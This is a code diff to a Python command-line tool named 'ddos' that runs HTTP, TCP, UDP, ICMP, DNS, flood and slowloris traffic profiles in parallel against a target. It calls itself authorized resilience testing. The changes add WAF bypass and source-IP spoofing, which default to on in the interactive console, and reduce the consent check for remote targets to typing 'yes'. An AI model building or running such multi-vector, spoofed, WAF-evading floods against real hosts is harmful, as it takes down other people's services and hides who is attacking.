-             spoof: bool = False, keepalive: int = 1, rand_path: bool = False,
-             read_reply: bool = False, size: int = 64) -> None:
+def _execute(*, label: str, profiles, target: str, method: str, body: str, port: int,
+             ramp: int, force_close: bool, rate: int, workers: int, duration: int,
+             timeout_ms: int, meta: dict, verbose: bool, output: str | None,
+             raw_path: str = "/", dns_name: str = "", dns_type: str = "A",
+             dns_server: str = "", udp_payload: str = "hackit-ddos-probe",
+             udp_echo: bool = True, spoof: bool = False, keepalive: int = 1,
+             rand_path: bool = False, read_reply: bool = False, size: int = 64,
+             sockets: int = 1000, interval_ms: int = 8000, waf: bool = False) -> None:
+    profiles = list(profiles)
     started = time.monotonic()
-    method_label = {
-        "http": method.upper(), "http-raw": f"HTTP-RAW:{port}", "tcp": f"TCP:{port}",
-        "dns": dns_type.upper(), "udp": "UDP", "icmp": "ICMP", "ws": "WS",
-        "udp-flood": f"UDP-FLOOD:{port}", "icmp-flood": "ICMP-FLOOD",
-    }.get(profile, f"{profile.upper()}:{port}")
-    dashboard = _Dashboard(label=label, target=target, method=method_label,
-                           rps=rate, workers=workers, duration_s=duration, started=started)
+    dash = _Dashboard(label=label, target=target, profiles=profiles, rate=rate,
+                      workers=workers, duration_s=duration, started=started)
 
     meta = {**meta, "started_utc": datetime.now(timezone.utc).isoformat()}
     try:
@@ -537,66 +524,81 @@ def _execute(*, label: str, profile: str, target: str, method: str, body: str,
         sys.exit(2)
 
     if verbose:
-        console.print(f"[dim]resolved target[/dim] {_host_of(target)}   [dim]audit[/dim] {AUDIT_LOG}")
+        console.print(f"[dim]resolved[/dim] {_host_of(target)}   [dim]audit[/dim] {AUDIT_LOG}")
+        console.print(f"[dim]caps[/dim] {rate}/s   {workers} workers   {duration}s")
 
+    reports: dict[str, dict] = {}
+    failures: list[str] = []
+    lock = threading.Lock()
     tty = console.is_terminal
 
-    def on_progress(p: dict) -> None:
-        dashboard.update(p)
-        if not tty:
-            s = dashboard.state
-            console.print(f"[dim]t={s['elapsed_s']:.1f}s[/dim] sent {s['requests']} · ok {s['ok']} · "
-                          f"err {s['errors']} · {s['achieved_rps']:.1f} r/s")
+    def make_progress(p: str):
+        def cb(data: dict) -> None:
+            dash.update(p, data)
+            if not tty:
+                s = dash.state[p]
+                console.print(f"[dim]{p} t={s['elapsed_s']:.1f}s[/dim] sent {s['requests']} · "
+                              f"ok {s['ok']} · err {s['errors']} · {s['achieved_rps']:.1f}/s")
+        return cb
 
-    try:
-        if tty:
-            with Live(dashboard.render(), console=console, refresh_per_second=10) as live:
-                def live_progress(p: dict) -> None:
-                    on_progress(p)
-                    live.update(dashboard.render())
-                report = _launch_engine(profile, target, method, body, port, ramp, force_close,
-                                    raw_path, rate, workers, duration, timeout_ms,
-                                    dns_name, dns_type, dns_server, udp_payload, udp_echo,
-                                    spoof, keepalive, rand_path, read_reply, size,
-                                    live_progress)
-        else:
-            report = _launch_engine(profile, target, method, body, port, ramp, force_close,
-                                    raw_path, rate, workers, duration, timeout_ms,
-                                    dns_name, dns_type, dns_server, udp_payload, udp_echo,
-                                    spoof, keepalive, rand_path, read_reply, size,
-                                    on_progress)
-    except engines.EngineError as exc:
-        console.print(f"[bold red]engine failure[/bold red] — {exc}")
+    def run_one(p: str) -> None:
+        try:
+            r = _run_one(p, target=target, method=method, body=body, port=port, ramp=ramp,
+                         force_close=force_close, raw_path=raw_path, rate=rate,
+                         workers=max(1, workers // len(profiles)), duration=duration,
+                         timeout_ms=timeout_ms, dns_name=dns_name, dns_type=dns_type,
+                         dns_server=dns_server, udp_payload=udp_payload, udp_echo=udp_echo,
+                         spoof=spoof, keepalive=keepalive, rand_path=rand_path,
+                         read_reply=read_reply, size=size, sockets=sockets,
+                         interval_ms=interval_ms, waf=waf, on_progress=make_progress(p))
+            with lock:
+                reports[p] = r
+        except engines.EngineError as exc:
+            with lock:
+                failures.append(f"{p}: {exc}")
+
+    threads = [threading.Thread(target=run_one, args=(p,), daemon=True) for p in profiles]
+
+    if tty:
+        with Live(dash.render(), console=console, refresh_per_second=8) as live:
+            for t in threads:
+                t.start()
+            while any(t.is_alive() for t in threads):
+                live.update(dash.render())
+                time.sleep(0.125)
+    else:
+        for t in threads:
+            t.start()
+    for t in threads:
+        t.join()
+
+    for f in failures:
+        console.print(f"[bold red]vector failed[/bold red] — {f}")
+    if not reports:
         sys.exit(1)
 
-    _final_report(report, label=label, rps_cap=rps, workers=workers, verbose=verbose, meta=meta)
+    _final_report(reports, label=label, rate_cap=rate, workers=workers,
+                  verbose=verbose, meta=meta)
+
     if output:
-        _write_report(output, report, meta)
-
-
-def _write_report(path: str, report: dict, meta: dict) -> None:
-    payload = {"meta": meta, "result": report}
-    Path(path).write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
-    console.print(f"[dim]report written to {path}[/dim]")
+        Path(output).write_text(json.dumps({"meta": meta, "results": reports}, indent=2) + "\n",
+                                encoding="utf-8")
+        console.print(f"[dim]report written to {output}[/dim]")
 
 
 @click.group(invoke_without_command=True)
 @click.pass_context
 def ddos(ctx: click.Context):
-    """Authorized resilience testing — scoped, capped, audited.
-
-    Run with no arguments to see the console help. Remote targets always
-    require authorization: a signed scope file (run) or a typed confirmation
-    (console). Loopback targets run immediately.
-    """
+    """Authorized resilience testing — scoped, capped, audited, multi-vector."""
     if ctx.invoked_subcommand is None:
         _print_help()
 
 
 @ddos.command()
 def build():
-    """Compile the Go and C engines."""
-    for label, fn in (("go", engines.build_go), ("c", engines.build_c)):
+    """Compile every engine."""
+    for label, fn in (("go", engines.build_go), ("c", engines.build_c),
+                      ("flood", engines.build_flood), ("slowloris", engines.build_slowloris)):
         try:
             path = fn()
         except engines.EngineError as exc:
@@ -606,17 +608,15 @@ def build():
 
 
 @ddos.command()
-@click.option("--scope", required=True, type=click.Path(exists=True, dir_okay=False), help="Signed scope file (JSON).")
-@click.option("--target", required=True, help="URL for http profile, bare host for tcp profile.")
-@click.option("--approval", required=True, help="Approval reference; must match scope approval_ref.")
-@click.option("--profile", type=click.Choice(["http", "http-raw", "tcp"]), default="http")
-@click.option("--port", default=80, show_default=True, type=int, help="Port for the tcp profile.")
-def check(scope, target, approval, profile, port):
-    """Validate scope, target and approval without generating any load."""
+@click.option("--scope", required=True, type=click.Path(exists=True, dir_okay=False))
+@click.option("--target", required=True)
+@click.option("--approval", required=True)
+@click.option("--profile", default="http")
+def check(scope, target, approval, profile):
+    """Validate scope, target and approval without generating load."""
     try:
         sc = load_scope(scope)
-        host = _host_of(target)
-        check_run(sc, host, approval)
+        check_run(sc, _host_of(target), approval)
     except ScopeError as exc:
         console.print(f"[bold red]refused[/bold red] — {exc}")
         sys.exit(2)
@@ -624,137 +624,140 @@ def check(scope, target, approval, profile, port):
     body.append(f"operator       {sc.operator}\n")
     body.append(f"approval       {sc.approval_ref}   expires {sc.expires.isoformat()}\n")
     body.append(f"allowlist      {', '.join(sc.targets)}\n")
-    body.append(f"caps           rps ≤ {sc.max_rps}/s   workers ≤ {sc.max_workers}   duration ≤ {sc.max_duration_s}s\n")
-    body.append(f"hard ceilings  {HARD_MAX_RPS}/{HARD_MAX_WORKERS}/{HARD_MAX_DURATION_S}", style="dim")
+    body.append(f"caps           rps ≤ {sc.max_rps}/s   pps ≤ {sc.max_pps}/s   "
+                f"workers ≤ {sc.max_workers}   duration ≤ {sc.max_duration_s}s\n")
+    body.append(f"hard ceilings  {HARD_MAX_RPS}/{HARD_MAX_PPS}/{HARD_MAX_WORKERS}/{HARD_MAX_DURATION_S}",
+                style="dim")
     console.print(Panel(body, title="[bold green]scope valid[/bold green]", border_style="green",
-                        box=box.ROUNDED, padding=(0, 1)))
+                        box=box.ROUNDED))
+
+
+def _profile_opt(default="http"):
+    return click.option("--profile", default=default, show_default=True,
+                        help="Comma-separated profiles to run in parallel.")
 
 
 @ddos.command()
-@click.option("--target", required=True, help="URL (http) or bare host (tcp).")
-@click.option("--scope", type=click.Path(exists=True, dir_okay=False), help="Signed scope file (JSON) — required for remote targets.")
-@click.option("--approval", help="Approval reference; must match scope approval_ref.")
-@click.option("--profile", type=click.Choice(ALL_PROFILES), default="http", show_default=True)
-@click.option("--port", default=80, show_default=True, type=int, help="Port for tcp/http-raw/udp/flood profiles.")
-@click.option("--dns-name", default="", help="Name to resolve (dns profile), e.g. example.com.")
-@click.option("--dns-type", type=click.Choice(["A", "AAAA", "MX", "TXT", "NS"]), default="A", show_default=True)
-@click.option("--udp-payload", default="hackit-ddos-probe", show_default=True)
-@click.option("--udp-no-echo", is_flag=True, help="Fire-and-forget UDP sends (no echo wait).")
-@click.option("--method", type=click.Choice(HTTP_METHODS), default="get", show_default=True,
-              help="HTTP verb, or 'mixed' to rotate verbs per request.")
-@click.option("--body", default="", help="Request body for POST/PUT/PATCH.")
-@click.option("--ramp", default=0, show_default=True, type=int, help="Seconds to linearly ramp 1 → --rps.")
-@click.option("--close", "force_close", is_flag=True, help="Send Connection: close (handshake stress).")
-@click.option("--path", default="/", show_default=True, help="HTTP path (http-raw/flood http profiles).")
-@click.option("--rps", default=50, show_default=True, type=int, help="Rate cap: requests/s (L7) or packets/s (L4).")
+@click.option("--target", required=True)
+@click.option("--scope", type=click.Path(exists=True, dir_okay=False))
+@click.option("--approval")
+@_profile_opt()
+@click.option("--port", default=80, show_default=True, type=int)
+@click.option("--dns-name", default="")
+@click.option("--dns-type", type=click.Choice(["A", "AAAA", "MX", "TXT", "NS"]), default="A")
+@click.option("--udp-payload", default="hackit-ddos-probe")
+@click.option("--udp-no-echo", is_flag=True)
+@click.option("--method", type=click.Choice(HTTP_METHODS), default="get", show_default=True)
+@click.option("--body", default="")
+@click.option("--ramp", default=0, type=int)
+@click.option("--close", "force_close", is_flag=True)
+@click.option("--path", default="/", show_default=True)
+@click.option("--rps", default=50, show_default=True, type=int,
+              help="Rate cap: requests/s (L7) or packets/s (L4).")
 @click.option("--workers", default=10, show_default=True, type=int)
-@click.option("--duration", default=10, show_default=True, type=int, help="Seconds; capped by scope and hard limit.")
-@click.option("--timeout-ms", default=5000, show_default=True, type=int, help="Per-request timeout (http profile).")
-@click.option("--spoof", is_flag=True, help="Randomise the source IP (raw L4 profiles; needs root).")
-@click.option("--keepalive", default=1, show_default=True, type=int,
-              help="Requests per connection, 0 = never reconnect (flood http).")
-@click.option("--rand-path", is_flag=True, help="Append a random query string per request (flood http).")
-@click.option("--read", "read_reply", is_flag=True, help="Also read the status line (flood http).")
-@click.option("--size", default=64, show_default=True, type=int, help="Payload bytes (flood udp/icmp/psh/http).")
-@click.option("--output", type=click.Path(dir_okay=False), help="Write the full JSON report here.")
-@click.option("-v", "--verbose", is_flag=True, help="Show resolved target, effective caps and audit path.")
+@click.option("--duration", default=10, show_default=True, type=int)
+@click.option("--timeout-ms", default=5000, show_default=True, type=int)
+@click.option("--spoof", is_flag=True)
+@click.option("--waf", is_flag=True)
+@click.option("--keepalive", default=1, show_default=True, type=int)
+@click.option("--rand-path", is_flag=True)
+@click.option("--read", "read_reply", is_flag=True)
+@click.option("--size", default=64, show_default=True, type=int)
+@click.option("--sockets", default=1000, show_default=True, type=int)
+@click.option("--interval-ms", default=8000, show_default=True, type=int)
+@click.option("--output", type=click.Path(dir_okay=False))
+@click.option("-v", "--verbose", is_flag=True)
 def run(target, scope, approval, profile, port, method, body, ramp, force_close, path,
-        rps, workers, duration, timeout_ms, output, verbose,
-        dns_name, dns_type, udp_payload, udp_no_echo,
-        spoof, keepalive, rand_path, read_reply, size):
+        rps, workers, duration, timeout_ms, output, verbose, dns_name, dns_type,
+        udp_payload, udp_no_echo, spoof, waf, keepalive, rand_path, read_reply,
+        size, sockets, interval_ms):
     """Run a scripted load test. Remote targets require --scope and --approval."""
-    host = _host_of(target)
-    loopback = (profile == "dns" and target.lower() == "system") or _is_loopback(host)
+    profiles = [p.strip().lower() for p in profile.split(",") if p.strip()]
+    unknown = [p for p in profiles if p not in ALL_PROFILES]
+    if unknown:
+        console.print(f"[bold red]refused[/bold red] — unknown profile(s): {', '.join(unknown)}")
+        sys.exit(2)
 
-    if profile == "dns" and not dns_name:
+    host = _host_of(target)
+    loopback = (target.lower() == "system") or _is_loopback(host)
+
+    if "dns" in profiles and not dns_name:
         console.print("[bold red]refused[/bold red] — dns profile requires --dns-name")
         sys.exit(2)
 
     if loopback:
-        cap = LAB_MAX_PPS if profile in L4_PROFILES else LAB_MAX_RPS
-        eff_rate = min(rps, cap)
-        eff_workers = min(workers, LAB_MAX_WORKERS)
-        eff_duration = min(duration, LAB_MAX_DURATION_S)
-        meta = _audit_meta("local", "lab-loopback", profile, target, eff_rate, eff_workers, eff_duration)
+        cap = LAB_MAX_PPS if any(is_l4(p) for p in profiles) else LAB_MAX_RPS
+        rate = min(rps, cap)
+        w = min(workers, LAB_MAX_WORKERS)
+        dur = min(duration, LAB_MAX_DURATION_S)
+        meta = _audit_meta("local", "lab-loopback", profiles, target, rate, w, dur)
     else:
         if not scope or not approval:
-            console.print("[bold red]refused[/bold red] — remote targets require --scope and --approval (loopback works without them)")
+            console.print("[bold red]refused[/bold red] — remote targets require --scope and --approval")
             sys.exit(2)
         try:
             sc = load_scope(scope)
             check_run(sc, host, approval)
-            limits = effective_limits(sc, profile, rps, workers, duration)
+            lim = effective_limits(sc, profiles, rps, workers, duration)
         except ScopeError as exc:
             console.print(f"[bold red]refused[/bold red] — {exc}")
             sys.exit(2)
-        eff_rate, eff_workers, eff_duration = limits.rate, limits.workers, limits.duration_s
-        meta = _audit_meta(sc.operator, sc.approval_ref, profile, target,
-                           eff_rate, eff_workers, eff_duration, sc.expires.isoformat())
+        rate, w, dur = lim.rate, lim.workers, lim.duration_s
+        meta = _audit_meta(sc.operator, sc.approval_ref, profiles, target, rate, w, dur,
+                           sc.expires.isoformat())
 
-    #  _execute(label="loopback lab", profile=profile, target=target,
-    #          method=method, body=body, port=port, ramp=ramp, force_close=force_close,
-    #          rate=eff_rate, workers=eff_workers, duration=eff_duration, timeout_ms=2000,
-    #          meta=meta, verbose=verbose, output=None,
-    #          dns_name=dns_name, dns_type=dns_type, dns_server=target,
-    #          udp_payload=udp_payload, udp_echo=not udp_no_echo, spoof=spoof)
-
-    _execute(label="scoped run" if not loopback else "loopback", profile=profile, target=target,
-             method=method, body=body, port=port, ramp=ramp, force_close=force_close,
-             rate=eff_rate, workers=eff_workers, duration=eff_duration, timeout_ms=timeout_ms,
-             meta=meta, verbose=verbose, output=output, raw_path=path,
-             dns_name=dns_name, dns_type=dns_type, dns_server=target,
-             udp_payload=udp_payload, udp_echo=not udp_no_echo,
-             spoof=spoof, keepalive=keepalive, rand_path=rand_path,
-             read_reply=read_reply, size=size)
+    _execute(label="scoped run" if not loopback else "loopback", profiles=profiles,
+             target=target, method=method, body=body, port=port, ramp=ramp,
+             force_close=force_close, rate=rate, workers=w, duration=dur,
+             timeout_ms=timeout_ms, meta=meta, verbose=verbose, output=output,
+             raw_path=path, dns_name=dns_name, dns_type=dns_type, dns_server=target,
+             udp_payload=udp_payload, udp_echo=not udp_no_echo, spoof=spoof,
+             keepalive=keepalive, rand_path=rand_path, read_reply=read_reply,
+             size=size, sockets=sockets, interval_ms=interval_ms, waf=waf)
 
 
 @ddos.command()
-@click.option("--target", required=True, help="Loopback URL (http) or bare loopback host (tcp).")
-@click.option("--profile", type=click.Choice(["http", "http-raw", "tcp", "dns", "udp", "icmp", "ws"]), default="http", show_default=True)
+@click.option("--target", required=True)
+@_profile_opt()
 @click.option("--port", default=80, show_default=True, type=int)
 @click.option("--dns-name", default="")
-@click.option("--dns-type", type=click.Choice(["A", "AAAA", "MX", "TXT", "NS"]), default="A", show_default=True)
-@click.option("--udp-payload", default="hackit-ddos-probe", show_default=True)
+@click.option("--dns-type", type=click.Choice(["A", "AAAA", "MX", "TXT", "NS"]), default="A")
+@click.option("--udp-payload", default="hackit-ddos-probe")
 @click.option("--udp-no-echo", is_flag=True)
 @click.option("--method", type=click.Choice(HTTP_METHODS), default="get", show_default=True)
-@click.option("--body", default="", help="Request body for POST/PUT/PATCH.")
-@click.option("--ramp", default=0, show_default=True, type=int)
+@click.option("--body", default="")
+@click.option("--ramp", default=0, type=int)
 @click.option("--close", "force_close", is_flag=True)
 @click.option("--rps", default=20, show_default=True, type=int)
 @click.option("--workers", default=4, show_default=True, type=int)
 @click.option("--duration", default=5, show_default=True, type=int)
-@click.option("-v", "--verbose", is_flag=True)
 @click.option("--spoof", is_flag=True)
-def lab(target, profile, port, dns_name, dns_type, udp_payload, udp_no_echo,
-        method, body, ramp, force_close, rps, workers, duration, verbose, spoof):
+@click.option("--waf", is_flag=True)
+@click.option("-v", "--verbose", is_flag=True)
+def lab(target, profile, port, dns_name, dns_type, udp_payload, udp_no_echo, method,
+        body, ramp, force_close, rps, workers, duration, spoof, waf, verbose):
     """Loopback-only smoke test. No scope file, tight caps."""
+    profiles = [p.strip().lower() for p in profile.split(",") if p.strip()]
     host = _host_of(target)
-    dns_system = profile == "dns" and target.lower() == "system"
-    if not dns_system and not _is_loopback(host):
-        console.print("[bold red]refused[/bold red] — lab mode is loopback-only (localhost / 127.0.0.1 / ::1)")
+    if target.lower() != "system" and not _is_loopback(host):
+        console.print("[bold red]refused[/bold red] — lab mode is loopback-only")
         sys.exit(2)
-    if profile == "dns" and not dns_name:
+    if "dns" in profiles and not dns_name:
         console.print("[bold red]refused[/bold red] — dns profile requires --dns-name")
         sys.exit(2)
 
-    eff_rps, eff_workers, eff_duration = min(rps, LAB_MAX_RPS), min(workers, LAB_MAX_WORKERS), min(duration, LAB_MAX_DURATION_S)
-    meta = _audit_meta("local", "lab-loopback", profile, target, eff_rps, eff_workers, eff_duration)
+    cap = LAB_MAX_PPS if any(is_l4(p) for p in profiles) else LAB_MAX_RPS
+    rate = min(rps, cap)
+    w = min(workers, LAB_MAX_WORKERS)
+    dur = min(duration, LAB_MAX_DURATION_S)
+    meta = _audit_meta("local", "lab-loopback", profiles, target, rate, w, dur)
 
-    _execute(label="loopback lab", profile=profile, target=target,
-             method=method, body=body, port=port, ramp=ramp, force_close=force_close,
-             rps=eff_rps, workers=eff_workers, duration=eff_duration, timeout_ms=2000,
-             meta=meta, verbose=verbose, output=None,
-             dns_name=dns_name, dns_type=dns_type, dns_server=target,
-             udp_payload=udp_payload, udp_echo=not udp_no_echo)
+    _execute(label="loopback lab", profiles=profiles, target=target, method=method,
+             body=body, port=port, ramp=ramp, force_close=force_close, rate=rate,
+             workers=w, duration=dur, timeout_ms=2000, meta=meta, verbose=verbose,
+             output=None, dns_name=dns_name, dns_type=dns_type, dns_server=target,
+             udp_payload=udp_payload, udp_echo=not udp_no_echo, spoof=spoof, waf=waf)
 
-# def _ask_int(prompt: str, default: int, lo: int, hi: int) -> int:
-#     raw = Prompt.ask(prompt, default=str(default))
-#     try:
-#         return _clamp(int(raw or default), lo, hi)
-#     except ValueError:
-#         console.print(f"[yellow]bukan angka — pakai {default}[/yellow]")
-#         return _clamp(default, lo, hi)
-    
 
 @ddos.command(name="console")
 def ddos_console():
@@ -763,16 +766,15 @@ def ddos_console():
 
     console.print()
     console.print(_banner())
-    console.print("  [dim]Loopback targets run immediately. Remote targets need a typed 'yes'[/dim]")
-    console.print("  [dim]confirming you own the system or hold written permission.[/dim]")
+    console.print("  [dim]Loopback targets run immediately. Remote targets need a typed 'yes'.[/dim]")
     console.print()
 
     while True:
-        raw = Prompt.ask("[bold cyan]target domain/IP[/bold cyan] (empty to quit)", default="", show_default=False).strip()
+        raw = Prompt.ask("[bold cyan]target domain/IP[/bold cyan] (empty to quit)",
+                         default="", show_default=False).strip()
         if not raw:
             console.print("[dim]rail cleared — bye.[/dim]")
             return
-
         try:
             host = _host_of(raw)
         except ScopeError as exc:
@@ -781,51 +783,58 @@ def ddos_console():
 
         remote = not _is_loopback(host)
         if remote:
-            console.print(f"\n  [bold yellow]'{host}' is remote.[/bold yellow] This console sends real load.")
-            answer = Prompt.ask("  Type [bold]yes[/bold] to confirm ownership or written permission", default="no").strip().lower()
-            if answer != AUTH_PHRASE:
-                console.print("[bold red]refused[/bold red] — authorization not confirmed, nothing was sent.\n")
+            console.print(f"\n  [bold yellow]'{host}' is remote.[/bold yellow] Real load.")
+            if Prompt.ask("  Type [bold]yes[/bold] to confirm permission",
+                          default="no").strip().lower() != AUTH_PHRASE:
+                console.print("[bold red]refused[/bold red] — nothing sent.\n")
                 continue
 
-        profile = Prompt.ask("profile", choices=["http", "http-raw", "tcp", "dns", "udp", "icmp", "ws"], default="http")
+        prof_raw = Prompt.ask("profile(s), comma-separated",
+                              default="http").strip().lower()
+        profiles = [p.strip() for p in prof_raw.split(",") if p.strip() in ALL_PROFILES]
+        if not profiles:
+            console.print("[bold red]refused[/bold red] — no valid profile")
+            continue
+
         port = 80
         method = "get"
         body = ""
-        ramp = 0
         dns_name = ""
         dns_type = "A"
-        if profile in ("tcp", "http-raw"):
-            port = _clamp(int(Prompt.ask("port", default="80") or "80"), 1, 65535)
-        elif profile == "http":
+        if any(is_l4(p) for p in profiles) or "http-raw" in profiles or "slowloris" in profiles:
+            port = _ask_int("port", 80 if "slowloris" not in profiles else 80, 1, 65535)
+        if "http" in profiles or "http-raw" in profiles:
             method = Prompt.ask("method", choices=HTTP_METHODS, default="get")
             if method in ("post", "put", "patch"):
-                body = Prompt.ask("body (JSON or text, empty for none)", default="")
-            ramp = _clamp(int(Prompt.ask("ramp seconds (0 = steady)", default="0") or "0"), 0, INTERACTIVE_MAX_DURATION_S)
-        elif profile == "dns":
-            dns_name = Prompt.ask("dns name to resolve", default="localhost")
+                body = Prompt.ask("body (empty for none)", default="")
+        if "dns" in profiles:
+            dns_name = Prompt.ask("dns name", default="localhost")
             dns_type = Prompt.ask("record type", choices=["A", "AAAA", "MX", "TXT", "NS"], default="A")
-        elif profile == "udp":
-            if ":" not in raw:
-                port = _clamp(int(Prompt.ask("udp port", default="7") or "7"), 1, 65535)
-        elif profile == "ws":
-            if not raw.lower().startswith(_WS_BASE_SCHEMES):
-                console.print("[bold red]refused[/bold red] — ws target must start with ws:// or wss://")
-                continue
+        if "ws" in profiles and not raw.lower().startswith(("ws://", "wss://")):
+            console.print("[bold red]refused[/bold red] — ws target needs ws:// or wss://")
+            continue
 
-        duration = _clamp(int(Prompt.ask("duration (s)", default=str(INTERACTIVE_DEFAULT_DURATION_S)) or INTERACTIVE_DEFAULT_DURATION_S), 1, INTERACTIVE_MAX_DURATION_S)
-        rps = _clamp(int(Prompt.ask("rate cap (rps)", default=str(INTERACTIVE_DEFAULT_RPS)) or INTERACTIVE_DEFAULT_RPS), 1, INTERACTIVE_MAX_RPS)
-        workers = _clamp(int(Prompt.ask("workers", default=str(INTERACTIVE_DEFAULT_WORKERS)) or INTERACTIVE_DEFAULT_WORKERS), 1, INTERACTIVE_MAX_WORKERS)
+        use_waf = Prompt.ask("waf bypass", choices=["y", "n"], default="y") == "y"
+        use_spoof = False
+        if any(is_l4(p) for p in profiles):
+            use_spoof = Prompt.ask("spoof source IP (needs root)",
+                                   choices=["y", "n"], default="y") == "y"
+
+        dur = _ask_int("duration (s)", INTERACTIVE_DEFAULT_DURATION_S, 1, INTERACTIVE_MAX_DURATION_S)
+        cap_hi = INTERACTIVE_MAX_PPS if any(is_l4(p) for p in profiles) else INTERACTIVE_MAX_RPS
+        dflt = INTERACTIVE_DEFAULT_PPS if any(is_l4(p) for p in profiles) else INTERACTIVE_DEFAULT_RPS
+        rate = _ask_int("rate cap", dflt, 1, cap_hi)
+        workers = _ask_int("workers", INTERACTIVE_DEFAULT_WORKERS, 1, INTERACTIVE_MAX_WORKERS)
 
         meta = _audit_meta("interactive", "interactive-confirmed" if remote else "lab-loopback",
-                           profile, raw, rps, workers, duration)
-        _execute(label="interactive", profile=profile, target=raw,
-                 method=method, body=body, port=port, ramp=ramp, force_close=False,
-                 rps=rps, workers=workers, duration=duration, timeout_ms=3000,
-                 meta=meta, verbose=False, output=None,
-                 dns_name=dns_name, dns_type=dns_type,
-                 dns_server=raw, udp_payload="hackit-ddos-probe", udp_echo=True)
+                           profiles, raw, rate, workers, dur)
+        _execute(label="interactive", profiles=profiles, target=raw, method=method,
+                 body=body, port=port, ramp=0, force_close=False, rate=rate,
+                 workers=workers, duration=dur, timeout_ms=3000, meta=meta,
+                 verbose=False, output=None, dns_name=dns_name, dns_type=dns_type,
+                 dns_server=raw, udp_payload="hackit-ddos-probe", udp_echo=True,
+                 spoof=use_spoof, waf=use_waf)
         console.print()
-        again = Prompt.ask("test another target?", choices=["y", "n"], default="n")
-        if again != "y":
+        if Prompt.ask("test another target?", choices=["y", "n"], default="n") != "y":
             console.print("[dim]rail cold — bye.[/dim]")
             return
